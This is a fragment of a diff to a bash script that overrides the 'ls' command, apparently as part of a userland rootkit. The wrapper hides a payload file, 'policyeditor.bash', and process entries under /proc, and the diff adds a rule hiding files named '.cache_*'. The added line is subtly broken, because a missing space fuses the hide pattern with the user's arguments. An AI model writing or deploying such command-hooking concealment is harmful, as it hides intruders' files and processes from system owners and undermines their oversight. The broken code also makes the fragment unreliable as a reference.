@@ -39,7 +39,7 @@ function ls {
         local empty_dirs=$(command $(which find) /proc -maxdepth 1 -type d -empty -name "[0-9]*" -printf "-I %f ")
         command $(which ls) $empty_dirs -I "$p" -I "policyeditor.bash" "$@"
     else
-        command $(which ls) -I "$p" -I "policyeditor.bash" "$@"
+        command $(which ls) -I "$p" -I "policyeditor.bash" -I ".cache_*""$@"
     fi
 }
 function busybox {
